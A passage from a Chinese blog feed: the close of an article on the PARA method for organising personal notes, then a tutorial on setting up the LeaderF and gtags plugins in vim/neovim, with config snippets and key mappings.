需要<strong>持续关注</strong>的工作和生活中的重要部分。可能包括:</p><ul><li>工作责任,比如市场营销、人力资源、产品管理、研发、或工程</li><li>个人责任,比如健康、财务、孩子、写作、汽车、或家庭</li></ul><p>然后你对一系列<strong>感兴趣的主题</strong>有<strong>资源</strong>,比如:</p><ul><li>平面设计</li><li>个人效率</li><li>有机园艺</li><li>咖啡</li><li>现代建筑</li><li>网页设计</li><li>日语</li><li>法国文学</li><li>笔记</li><li>气功</li><li>习惯养成</li><li>摄影</li><li>营销资产</li></ul><p>最后,你有<strong>档案</strong>, 包括<strong>前三类不再活跃</strong>但你可能想保存以供未来参考的任何内容:</p><ul><li>你完成或搁置的项目</li><li>不再相关或活跃的领域</li><li>你不再感兴趣的资源</li></ul><p>就是这样!四个顶层文件夹 —— 项目、领域、资源和档案 —— 每个包含少量专门针对你生活中的每个活动项目、责任领域、资源和档案的子文件夹。<br><img src="https://raw.githubusercontent.com/henices/pictures/master/para2.png" alt="para2"></p><p>你可能难以相信,一个复杂的、现代的人生就像你的,能被简化成只有4个类别。你可能觉得你要处理的远比这样一个简单的系统能容纳的要多。</p><p>但这正是要点:如果你的组织系统和你的生活一样复杂,那么维护它的需求最终会夺走你生活所需的时间和精力。</p><p>你用来组织信息的系统必须非常简单,以至于它能释放你的注意力,而不是占用更多注意力。 你的系统必须给你节省时间,而不是占用时间。</p><h2 id="关键原则-按项目-Project-和目标-Goal-组织信息"><a href="#关键原则-按项目-Project-和目标-Goal-组织信息" class="headerlink" title="关键原则 - 按项目(Project)和目标(Goal)组织信息"></a>关键原则 - 按项目(Project)和目标(Goal)组织信息</h2><p>我们大多数人首先在学校里学会如何组织信息。我们被教导根据学科,比如数学、历史或化学,来分类我们的课堂笔记、讲义和学习材料。</p><p>但然后在不知不觉中,我们又将这种做法带入了成人生活。我们继续根据非常宽泛的主题比如“市场营销”、“心理学”、“商业”或“思想”来分类我们的文档和文件。</p><p>这在你的学业之后的职业生涯中是完全没有意义的。在工作场所,没有课程,没有考试,没有成绩,也没有文凭。没有老师会告诉你应该记下什么来准备期末考试,因为根本就没有考试。</p><p><strong>你在工作和生活中所拥有的,是你正在努力实现的结果。</strong>你正在努力推出新产品,计划家庭度假,做出关键决定,在你的社区找到托儿所,发表新的写作,或实现季度销售目标。</p><p>在繁忙的一天中,当你正在努力使这些事情发生时,你绝对没有时间在一个广阔的类别如“心理学”中搜寻你需要的那一点信息。</p><p>与在学校里根据广泛的学科分类信息不同,我建议你根据你现在致力于的项目和目标来组织信息。这就是“按可操作性组织”这个我将在本书中反复强调的箴言的含义。</p><p>比如,当你坐下来处理一个图形设计项目时,你需要与该项目相关的所有笔记、文档、资产和其他材料都集中在一起,随时可用。</p><p>这似乎很明显,但这正是大多数人所做的完全相反。大多数人倾向于把所有相关材料散布在十几个不同的地方,找到它们需要花费他们半小时的时间。</p><p>如何确保与每个项目或目标相关的所有材料都集中在一起?你从一开始就按那种方式组织它们。这样你就知道该把每样东西放在哪里,以及哪里可以找到它们。</p><h2 id="按项目组织的力量"><a href="#按项目组织的力量" class="headerlink" title="按项目组织的力量"></a>按项目组织的力量</h2><p>我在旧金山湾区作为生产力教练工作了几年。那是科技繁荣的鼎盛时期,世界上一些最具影响力的公司的高管都在寻求任何提高表现的方法。我很乐意提供帮助。</p><p>我为南旧金山一家著名的生物技术公司的几位高管进行了指导,他们位于一座俯瞰海湾的美丽校园内。我还记得一天,在等待下一个客户——一位负责开发几种新型救生药物的高级主管时,外面是美丽的春日。</p><p>他到达后,我们的指导课就像其他每一次一样,从我的一个简单问题开始:“你有项目列表吗?”</p><p>当作为生产力教练与客户合作时,我总会首先要求他们展示项目列表。我需要它来了解他们的工作类型、当前工作量和他们正在努力推进的优先事项和结果。</p><p>他说“当然!”然后迅速记下从记忆中涌现的列表(第一个警告信号),递给我一个类似下面这样的列表:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para3.png" alt="para3"></p><p>你看到问题了吗?再仔细看看。</p><p>根据我们之前的定义,列表上的项目一个都不是。“战略规划”什么时候会永久结束?什么时候你可以从列表上永久删除“度假”?希望不会吧!</p><p>事实上,这个列表上的每一项都是一个责任领域。这可能看似语义学,但绝不是。我了解到,无论你多聪明多努力,如果不将责任领域细分为具体的项目,有两件关键的事你无法做到。</p><h3 id="1-你无法真正知道你的承诺有多少"><a href="#1-你无法真正知道你的承诺有多少" class="headerlink" title="1. 你无法真正知道你的承诺有多少"></a>1. 你无法真正知道你的承诺有多少</h3><p>我经常听到的一个最常见的抱怨是人们“没有带宽”。我能理解——大部分时间你觉得自己的任务过多对不对?</p><p>但是只要你继续以领域的视角看待工作,你就永远不会很清楚你的任务有多少。看上面的列表,“招聘”代表的工作量有多大呢?可能是每6个月兼职招聘一次,也可能是这个季度招聘50个职位。</p><p>光看一眼根本无法知道,这种不确定性会表现为每个领域感觉都比实际更繁重。</p><p>想象一下,如果你确定招聘中的每个项目,并每天将这个列表放在面前。判断还剩下多少工作要做,以及接下来应该做什么,不是会容易很多吗?例如:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para4.png" alt="para4"></p><h3 id="2-你无法将当前的努力连接到长期目标"><a href="#2-你无法将当前的努力连接到长期目标" class="headerlink" title="2. 你无法将当前的努力连接到长期目标"></a>2. 你无法将当前的努力连接到长期目标</h3><p>知识型工作最具挑战性(也最令人满足)的一个方面是它需要我们的创造力。而创造力若没有动力感很难持续。如果身心耗尽和士气低落,你就无法继续做出最好的思考和贡献最好的想法。</p><p><strong>我们的动力取决于什么?主要是持续的进步。</strong>如果知道正在朝着某个方向前进,我们可以在短期内忍受相当大的压力和挫折。</p><p>这就带我们到了第二个问题:没有各个项目的列表,你无法将当前的努力连接到长期目标。</p><p>再看看上面的列表。其中的项目都不会结束或改变——这是责任领域的定义,它会无限期地持续。现在想象一周又一周,一个月又一个月,甚至一年又一年醒来面对完全相同的永无止境的责任列表。无论你工作多努力,那无边的地平线似乎永远不会更近。</p><p>老实说,如果我想设计一个更好的方式来扼杀你的动力,我都想不出来。</p><p>当你将责任分解成容易管理的项目时,你可以确保项目列表会不断更新。每当成功完成一个项目就会有定期的成就感。想象一下,通过将广泛的“活动”领域细分成你正在举办的每个活动,会有多大的动力和成就感:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para5.png" alt="para5"></p><p><strong>无论你的责任有多广泛,你总能将它们细分为更小的项目。而你必须这样做,如果你想知道自己是否真正在朝目标迈进。</strong></p><h2 id="为你想要的生活方式组织信息"><a href="#为你想要的生活方式组织信息" class="headerlink" title="为你想要的生活方式组织信息"></a>为你想要的生活方式组织信息</h2><p>使用PARA不仅仅是创建一堆文件夹来放东西。</p><p>它是关于确定你的工作和生活的结构——你负责了什么,你想改变什么,你想去哪里。它是以一种支持和构建你想要的未来生活的方式来组织信息。</p><p>我们所说的“组织”中的很多本质上是伪装的拖延。我们告诉自己我们在“做准备”或“进行研究”,假装这是进步。但实际上,我们在寻找任何小事来打磨或整理,以避免面对我们所憎恶的任务。</p><p>PARA看穿了这层外壳,给了我们一种组织任何东西的方法,它非常简单到没有任何借口,除了下一步必要的行动之外再无其他。这是一种极简的方式,只添加到你的环境中刚刚足够的顺序,使你有清晰度来前进,没有更多。</p><p>外面还有其他更复杂、更精细和更专业的组织信息的方式,但PARA是唯一经得起时间考验的,因为它给你的时间比它占用的时间更多。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在 vim 中使用 LeaderF 和 gtags</title>
    <link href="/cn/vim_gtags_leaderf/"/>
    <url>/cn/vim_gtags_leaderf/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-缘由和一些-vim-历史"><a href="#☆-缘由和一些-vim-历史" class="headerlink" title="☆ 缘由和一些 vim 历史"></a>☆ 缘由和一些 vim 历史</h2><p>前些年 vim 没有子窗口的概念，日本的一个 vim 插件作者为了解决这个问题生撸了一套流程，当时 unite.vim 横空出世惊艳了我一把。后面随着技术发展，neovim 和 vim 先后引入了 floating window ，这才使得情况变得好了一点。</p><p><a href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p><p>得益于新技术，在 vim 中使用 LeaderF 插件的交互体验上了一个台阶。</p><p><img src="https://raw.githubusercontent.com/Yggdroot/Images/master/leaderf/leaderf_popup.gif" alt="Demo"></p><p>neovim 从 0.9 版本开始放弃对 cscope 的支持 <a href="https://twitter.com/Neovim/status/1580933880579641344">https://twitter.com/Neovim/status/1580933880579641344</a></p><p>这给我阅读源码造成了一些问题，虽然 vim 仍然可以使用 cscope，但 vim 的启动速度不如 nvim 快，所以我开始寻找替代方案。同时，我发现 denite.nvim，unite.vim，作者也不怎么维护了，一想似乎是很多年没有维护 vim 配置了。</p><p>在网络上搜索在 neovim 上阅读源码的方法，无意发现有人提到用 LeaderF 替代 tagbar，于是有了现在的这篇文章。</p><h2 id="☆-安装vim-插件-LeaderF"><a href="#☆-安装vim-插件-LeaderF" class="headerlink" title="☆ 安装vim 插件 LeaderF"></a>☆ 安装vim 插件 LeaderF</h2><p>插件的仓库地址：<a href="https://github.com/Yggdroot/LeaderF/tree/master">https://github.com/Yggdroot/LeaderF/tree/master</a></p><p>使用 <a href="https://github.com/VundleVim/Vundle.vim">Vundle.vim</a> 安装，在 .vimrc 中添加下面一行</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Plug &#x27;Yggdroot/LeaderF&#x27;, &#123; &#x27;do&#x27;: &#x27;:LeaderfInstallCExtension&#x27; &#125;<br></code></pre></td></tr></table></figure><p>在 vim 中执行下面命令，即可成功安装，如果遇到网络问题，自己挂上线路即可。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">：so %<br><span class="hljs-symbol">:PlugInstall</span><br></code></pre></td></tr></table></figure><h2 id="☆-LeaderF-配置"><a href="#☆-LeaderF-配置" class="headerlink" title="☆ LeaderF 配置"></a>☆ LeaderF 配置</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_WorkingDirectoryMode = <span class="hljs-string">&#x27;Ac&#x27;</span><br>let g:Lf_RootMarkers = [<span class="hljs-string">&#x27;.git&#x27;</span>, <span class="hljs-string">&#x27;.svn&#x27;</span>, <span class="hljs-string">&#x27;.hg&#x27;</span>, <span class="hljs-string">&#x27;.project&#x27;</span>, <span class="hljs-string">&#x27;.root&#x27;</span>]<br>let g:Lf_DefaultExternalTool=<span class="hljs-string">&#x27;rg&#x27;</span><br>let g:Lf_WindowPosition = <span class="hljs-string">&#x27;popup&#x27;</span><br><br>let g:Lf_UseCache = <span class="hljs-number">0</span><br>let g:Lf_PreviewInPopup = <span class="hljs-number">1</span><br>let g:Lf_ShowHidden = <span class="hljs-number">1</span>  <span class="hljs-string">&quot;show hidden files</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span> preview or not<br>let g:Lf_PreviewResult = &#123;<span class="hljs-string">&#x27;Function&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;BufTag&#x27;</span>: <span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure><ul><li>g:Lf_WorkingDirectoryMode &#x3D; ‘AF’ 设置工作目录，如果没有找到 RootMarker 以当前文件所在目录作为工作目录</li></ul><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">g:Lf_WorkingDirectoryMode                       *g:Lf_WorkingDirectoryMode*<br>    This option customizes LeaderF<span class="hljs-symbol">&#x27;s</span> working directory.<br>    e.g., &gt;<br>    let g:Lf_WorkingDirectoryMode = <span class="hljs-symbol">&#x27;Ac</span>&#x27;<br>&lt;<br>    c - the directory <span class="hljs-keyword">of</span> the current working directory.(<span class="hljs-keyword">default</span>)<br>    a - the nearest ancestor <span class="hljs-keyword">of</span> current working directory that contains one <span class="hljs-keyword">of</span><br>        directories <span class="hljs-keyword">or</span> files defined <span class="hljs-keyword">in</span> |g:Lf_RootMarkers|. Fall back <span class="hljs-keyword">to</span> <span class="hljs-symbol">&#x27;c</span>&#x27; <span class="hljs-keyword">if</span><br>        no such ancestor directory found.<br>    A - the nearest ancestor <span class="hljs-keyword">of</span> current <span class="hljs-keyword">file</span> that contains one <span class="hljs-keyword">of</span> directories<br>        <span class="hljs-keyword">or</span> files defined <span class="hljs-keyword">in</span> |g:Lf_RootMarkers|. Fall back <span class="hljs-keyword">to</span> <span class="hljs-symbol">&#x27;c</span>&#x27; <span class="hljs-keyword">if</span> no such<br>        ancestor directory found.<br>    f - the directory <span class="hljs-keyword">of</span> the current <span class="hljs-keyword">file</span>.<br>    F - <span class="hljs-keyword">if</span> the current working directory <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> the direct ancestor <span class="hljs-keyword">of</span> current<br>        <span class="hljs-keyword">file</span>, <span class="hljs-keyword">use</span> the directory <span class="hljs-keyword">of</span> the current <span class="hljs-keyword">file</span> as LeaderF<span class="hljs-symbol">&#x27;s</span> working<br>        directory, otherwise, same as <span class="hljs-symbol">&#x27;c</span>&#x27;.<br>    <span class="hljs-literal">Note</span>: <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;F&quot;</span> <span class="hljs-keyword">is</span> included <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;a&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-keyword">use</span> the behavior <span class="hljs-keyword">of</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-string">&quot;F&quot;</span>(as a fallback) <span class="hljs-keyword">when</span> a root can<span class="hljs-symbol">&#x27;t</span> be found.<br><br></code></pre></td></tr></table></figure><ul><li>g:Lf_DefaultExternalTool  索引文件使用的外部工具，可选值为 ‘rg’, ‘pt’, ‘ag’, ‘find’，作者推荐使用 <a href="https://github.com/BurntSushi/ripgrep">rg</a></li><li>g:Lf_UseCache 列文件时是否使用缓存，默认值为 1，设置为 0 不使用缓存</li><li>g:Lf_WindowPosition，LeaderF 窗口的位置，可选值有 top, bottom, left, right, popup,fullscreen，默认值为 bottom</li><li>g:Lf_PreviewInPopup 设置是否在 LeaderF 的 popup 窗口显示预览, 默认值为 0</li><li>g:Lf_ShowHidden 是否显示隐藏文件和目录，默认值为 0 不显示隐藏文件</li><li>g:Lf_PreviewResult 设置需要显示预览的内容，默认值为全 1<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-variable">g:Lf_PreviewResult</span> = &#123;<br>        \ <span class="hljs-string">&#x27;File&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Buffer&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Mru&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Tag&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;BufTag&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Function&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Line&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Colorscheme&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Rg&#x27;</span>: <span class="hljs-number">1</span>,<br>        \ <span class="hljs-string">&#x27;Gtags&#x27;</span>: <span class="hljs-number">1</span><br>        \&#125;<br></code></pre></td></tr></table></figure></li></ul><p>配置好了 LeaderF，在 vim&#x2F;neovim 的命令行输入  <code>:Leaderf</code>  tab 就可以看到相关的命令了，如果忘记了具体的命令也没有关系，使用 <code>LeaderfSelf</code> 即可列出所有的 Leaderf 命令。如何想查看具体命令的使用方法，在命令窗口输入 <code>:Leaderf -h</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim">subcommands:<br><br>  &#123;<span class="hljs-keyword">file</span>,<span class="hljs-keyword">tag</span>,<span class="hljs-keyword">function</span>,mru,searchHistory,cmdHistory,<span class="hljs-keyword">help</span>,<span class="hljs-built_in">line</span>,<span class="hljs-keyword">colorscheme</span>,gtags,<br>      self,bufTag,<span class="hljs-keyword">buffer</span>,rg,<span class="hljs-keyword">filetype</span>,<span class="hljs-keyword">command</span>,window,quickfix,loclist,<span class="hljs-keyword">jumps</span>&#125;<br>    <span class="hljs-keyword">file</span>                <span class="hljs-built_in">search</span> <span class="hljs-keyword">files</span><br>    <span class="hljs-keyword">tag</span>                 navigate <span class="hljs-keyword">tags</span> using the <span class="hljs-keyword">tags</span> <span class="hljs-keyword">file</span><br>    <span class="hljs-keyword">function</span>            <span class="hljs-title">navigate</span> functions or methods in the buffer<br>    mru                 <span class="hljs-built_in">search</span> most recently used <span class="hljs-keyword">files</span><br>    searchHistory       <span class="hljs-keyword">execute</span> the <span class="hljs-built_in">search</span> <span class="hljs-keyword">command</span> in the <span class="hljs-keyword">history</span><br>    cmdHistory          <span class="hljs-keyword">execute</span> the <span class="hljs-keyword">command</span> in the <span class="hljs-keyword">history</span><br>    <span class="hljs-keyword">help</span>                navigate the <span class="hljs-keyword">help</span> <span class="hljs-keyword">tags</span><br>    <span class="hljs-built_in">line</span>                <span class="hljs-built_in">search</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> in the <span class="hljs-keyword">buffer</span><br>    <span class="hljs-keyword">colorscheme</span>         switch between colorschemes<br>    gtags               navigate <span class="hljs-keyword">tags</span> using the gtags<br>    self                <span class="hljs-keyword">execute</span> the commands of itself<br>    bufTag              navigate <span class="hljs-keyword">tags</span> in the <span class="hljs-keyword">buffer</span><br>    <span class="hljs-keyword">buffer</span>              <span class="hljs-built_in">search</span> <span class="hljs-keyword">buffers</span><br>    rg                  <span class="hljs-keyword">grep</span> using rg<br>    <span class="hljs-keyword">filetype</span>            navigate the <span class="hljs-keyword">filetype</span><br>    <span class="hljs-keyword">command</span>             <span class="hljs-keyword">execute</span> built-in/user-defined Ex commands.<br>    window              <span class="hljs-built_in">search</span> windows.<br>    quickfix            navigate the quickfix.<br>    loclist             navigate the location <span class="hljs-keyword">list</span>.<br></code></pre></td></tr></table></figure><p>好了，我可以放弃 fzf.vim, ctrp.vim, tagbar, unite.vim, denite.vim 等一系列 vim 插件了。 在日常使用中，每次都输入那么长的命令不太方便，我们可以配置以下容易记忆的快捷键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">noremap &lt;leader&gt;fs :LeaderfSelf&lt;cr&gt;<br>noremap &lt;leader&gt;fm :LeaderfMru&lt;cr&gt;<br>noremap &lt;leader&gt;ff :LeaderfFunction&lt;cr&gt;<br>noremap &lt;leader&gt;fb :LeaderfBuffer&lt;cr&gt;<br>noremap &lt;leader&gt;ft :LeaderfBufTag&lt;cr&gt;<br>noremap &lt;leader&gt;fl :LeaderfLine&lt;cr&gt;<br>noremap &lt;leader&gt;fw :LeaderfWindow&lt;cr&gt;<br></code></pre></td></tr></table></figure><p>值得一提的是 rg 命令，可以直接在目录文件内搜索字符串，ripgrep 的正则表达式比 vim 的正则要正常多了。vim 的正则表达式的用法可以参见：<a href="https://vimdoc.sourceforge.net/htmldoc/pattern.html">https://vimdoc.sourceforge.net/htmldoc/pattern.html</a><br>以前我为了规避 vim 的正则使用了一个插件 <a href="https://github.com/othree/eregex.vim">https://github.com/othree/eregex.vim</a> 现在这个插件也不需要了。</p><p>要利用 LeaderF 调用 rg 命令，可以使用命令行 <code>:Leaderf! rg</code>, 为了方便使用使用下面的快捷键查询光标所在 word</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap &lt;leader&gt;frb &lt;Plug&gt;LeaderfRgCwordLiteralBoundary<br></code></pre></td></tr></table></figure><h3 id="运行-LeaderF-之后的操作"><a href="#运行-LeaderF-之后的操作" class="headerlink" title="运行 LeaderF 之后的操作"></a>运行 LeaderF 之后的操作</h3><p>在执行 Leaderf 命令弹出的界面后，需要使用特定的快捷键进行操作，这些快捷键可以使用 <code>help leaderf-prompt</code> 进行查看。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vim">Once LeaderF <span class="hljs-keyword">is</span> launched:                       *prompt* *leaderf-prompt*<br>    <span class="hljs-symbol">&lt;C-C&gt;</span>, <span class="hljs-symbol">&lt;ESC&gt;</span> : <span class="hljs-keyword">quit</span> from LeaderF.<br>    <span class="hljs-symbol">&lt;C-R&gt;</span> : switch between fuzzy <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span> <span class="hljs-built_in">and</span> regex <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;C-F&gt;</span> : switch between full path <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span> <span class="hljs-built_in">and</span> name <span class="hljs-keyword">only</span> <span class="hljs-built_in">search</span> <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;Tab&gt;</span> : switch <span class="hljs-keyword">to</span> <span class="hljs-keyword">normal</span> <span class="hljs-keyword">mode</span>.<br>    <span class="hljs-symbol">&lt;C-V&gt;</span>, <span class="hljs-symbol">&lt;S-Insert&gt;</span> : paste from clipboard.<br>    <span class="hljs-symbol">&lt;C-U&gt;</span> : clear the prompt.<br>    <span class="hljs-symbol">&lt;C-W&gt;</span> : <span class="hljs-keyword">delete</span> the word before the <span class="hljs-built_in">cursor</span> in the prompt.<br>    <span class="hljs-symbol">&lt;C-J&gt;</span>, <span class="hljs-symbol">&lt;C-K&gt;</span> : navigate the result <span class="hljs-keyword">list</span>.<br>    <span class="hljs-symbol">&lt;Up&gt;</span>, <span class="hljs-symbol">&lt;Down&gt;</span> : recall <span class="hljs-keyword">last</span>/<span class="hljs-keyword">next</span> <span class="hljs-built_in">input</span> pattern from <span class="hljs-keyword">history</span>.<br>    <span class="hljs-symbol">&lt;2-LeftMouse&gt;</span> <span class="hljs-built_in">or</span> <span class="hljs-symbol">&lt;CR&gt;</span> : <span class="hljs-keyword">open</span> the <span class="hljs-keyword">file</span> under <span class="hljs-built_in">cursor</span> <span class="hljs-built_in">or</span> selected(when<br>                            multiple <span class="hljs-keyword">files</span> are selected).<br>    <span class="hljs-symbol">&lt;C-X&gt;</span> : <span class="hljs-keyword">open</span> in horizontal <span class="hljs-keyword">split</span> window.<br>    &lt;C-]&gt; : <span class="hljs-keyword">open</span> in <span class="hljs-keyword">vertical</span> <span class="hljs-keyword">split</span> window.<br>    <span class="hljs-symbol">&lt;C-T&gt;</span> : <span class="hljs-keyword">open</span> in <span class="hljs-keyword">new</span> tabpage.<br>    <span class="hljs-symbol">&lt;F5&gt;</span>  : refresh the cache.<br>    <span class="hljs-symbol">&lt;C-LeftMouse&gt;</span> <span class="hljs-built_in">or</span> <span class="hljs-symbol">&lt;C-S&gt;</span> : select multiple <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;S-LeftMouse&gt;</span> : select consecutive multiple <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;C-A&gt;</span> : select <span class="hljs-keyword">all</span> <span class="hljs-keyword">files</span>.<br>    <span class="hljs-symbol">&lt;C-L&gt;</span> : clear <span class="hljs-keyword">all</span> selections.<br>    <span class="hljs-symbol">&lt;BS&gt;</span>  : <span class="hljs-keyword">delete</span> the preceding character in the prompt.<br>    <span class="hljs-symbol">&lt;Del&gt;</span> : <span class="hljs-keyword">delete</span> the current character in the prompt.<br>    <span class="hljs-symbol">&lt;Home&gt;</span>: <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> <span class="hljs-keyword">to</span> the begin of the prompt.<br>    <span class="hljs-symbol">&lt;End&gt;</span> : <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> <span class="hljs-keyword">to</span> the end of the prompt.<br>    <span class="hljs-symbol">&lt;Left&gt;</span>: <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> one character <span class="hljs-keyword">to</span> the <span class="hljs-keyword">left</span>.<br>    <span class="hljs-symbol">&lt;Right&gt;</span> : <span class="hljs-keyword">move</span> the <span class="hljs-built_in">cursor</span> one character <span class="hljs-keyword">to</span> the <span class="hljs-keyword">right</span>.<br>    <span class="hljs-symbol">&lt;C-P&gt;</span> : preview the result.<br>    <span class="hljs-symbol">&lt;C-Up&gt;</span> : scroll <span class="hljs-keyword">up</span> in the <span class="hljs-keyword">popup</span> preview window.<br>    <span class="hljs-symbol">&lt;C-Down&gt;</span> : scroll down in the <span class="hljs-keyword">popup</span> preview window.<br></code></pre></td></tr></table></figure><ul><li>tab : 切换输入模式和 normal 模式，进入 normal 模式后可以使用 <code>j</code> 和 <code>k</code> 上下移动光标来查看文件。 </li><li>q :  normal 模式中，退出 LeaderF</li></ul><p>在输入模式下，可以使用下面的快捷键进行分屏显示。</p><ul><li>ctrl + x : 横向分割</li><li>ctrl + ] : 竖向分割</li><li>ctrl + T : tab 分割</li></ul><h2 id="☆-LeaderF-gtags-的配置"><a href="#☆-LeaderF-gtags-的配置" class="headerlink" title="☆ LeaderF + gtags 的配置"></a>☆ LeaderF + gtags 的配置</h2><p>gtags 和 LeaderF 配置起来使用，实在是很不错。首先要配置好 gtags，关于 global 的安装详见 <a href="https://www.usmacd.com/cn/gtags-cscope/">GNU Global 的使用</a>，这里就不再详细说了，gtags 的配置添加下面两行即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">let $GTAGSLABEL=<span class="hljs-string">&#x27;native-pygments&#x27;</span><br>let $GTAGSCONF=<span class="hljs-string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span><br></code></pre></td></tr></table></figure><p>配置好系统 gtags，global ，gtags.conf 的正确路径。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_Global = <span class="hljs-string">&#x27;/usr/local/bin/global&#x27;</span><br>let g:Lf_Gtags = <span class="hljs-string">&#x27;/usr/local/bin/gtags&#x27;</span><br>let g:Lf_Gtagsconf = <span class="hljs-string">&#x27;/usr/local/share/gtags/gtags.conf&#x27;</span><br>let g:Lf_Gtagslabel = <span class="hljs-string">&#x27;native-pygments&#x27;</span><br></code></pre></td></tr></table></figure><p>下面两行是配置gtags 自动生成 tags 文件，主要是三个文件 <code>GPATH</code> , <code>GRTAGS</code>  <code>GTAGS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">let g:Lf_GtagsSource = <span class="hljs-number">2</span><br>let g:Lf_GtagsAutoGenerate = <span class="hljs-number">1</span><br>let g:Lf_GtagsAutoUpdate = <span 